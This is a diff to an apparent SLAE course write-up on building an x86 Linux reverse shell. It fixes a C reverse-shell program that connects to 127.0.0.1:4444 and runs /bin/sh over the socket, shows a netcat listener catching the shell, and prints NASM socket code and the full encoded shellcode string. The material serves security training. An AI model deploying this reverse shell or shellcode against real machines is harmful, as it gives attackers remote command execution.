@@ -26,7 +26,7 @@ int main()
 }
 ```
 
-*Socket *usage is easy to understand using the manual
+*Socket* usage is easy to understand using the manual
 
 ```C
 NAME
@@ -55,40 +55,40 @@ The inet_addr() function converts the Internet host address cp from IPv4 numbers
 
 int main()
 {
- int my_socket = socket(AF_INET, SOCK_STREAM, 0);
- struct sockaddr_in my_sockaddr;
- my_sockaddr.sin_family = AF_INET;
+     int my_socket = socket(AF_INET, SOCK_STREAM, 0);
+     struct sockaddr_in my_sockaddr;
+     my_sockaddr.sin_family = AF_INET;
      my_sockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
      my_sockaddr.sin_port = htons(4444);
 
      connect(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));
 
- int i;
- for(i = 0; i++; i <3)
-  dup2(my_socket, i);
-
- execve("/bin/sh", NULL, NULL);
- return 0;
+     int i;
+     for(i = 0; i < 3; i++)
+          dup2(my_socket, i);
+          
+     execve("/bin/sh", NULL, NULL);
+     return 0;
 }
-
 ```
 ### Testing the reverse shell
 
 First, the C file is compiled.
 ```
-cervoise@slae:~/exam/reverse$ gcc reverse_shell.c -o reverse_shell
+$ gcc reverse_shell.c -o reverse_shell
 ```
 Then netcat is used to listen on port 444
 ```
-cervoise@slae:~/exam/reverse$ nc -lv 4444
+$ nc -lv 4444
 ```
 
-And by running the ELF binary, a (local) reverse shell is gain
+And by running the ELF binary, a (local) reverse shell is gain on the listener:
 ```
-cervoise@slae:~/exam/reverse$ ./reverse_shell 
-$ id
+$ nc -lv 4444
+Connection from 127.0.0.1 port 4444 [tcp/*] accepted
+id
 uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
-$ exit
+exit
 ```
 
 # Exo 2 - Reverse shellcode - Part 2 - Reverse Shellcode
@@ -104,7 +104,7 @@ The only new thing is a call to connect using a different sockaddr_in address.
 ### Socket
 
 Same code as for the bind shellcode:
-`̀``ASM
+```ASM
 xor eax, eax
 mov al, 0x66
 xor ebx, ebx
@@ -118,7 +118,7 @@ mov ecx, esp
 int 0x80
 
 mov edi, eax
-`̀``
+```
 
 ### Connect
 
@@ -255,7 +255,7 @@ duploop:
 Compilation is done using *nasm*:
 ```
 $ nasm -f elf32 -o reverse_shellcode.o reverse_shellcode.nasm
-$ reverse_shellcode.o
+$ bash ../get-shellcode.sh reverse_shellcode.o
 "\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x43\x66\x53\x43\x89\xe2\xb0\x66\x6a\x10\x52\x57\x89\xe1\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\xcd\x80"
 ```
 
@@ -304,7 +304,7 @@ Code is very similar as previously. The only new part is to handle the IP addres
 - without 0
 - with 0 but without 255
 
-```
+```python
 #!python3
 
 import sys
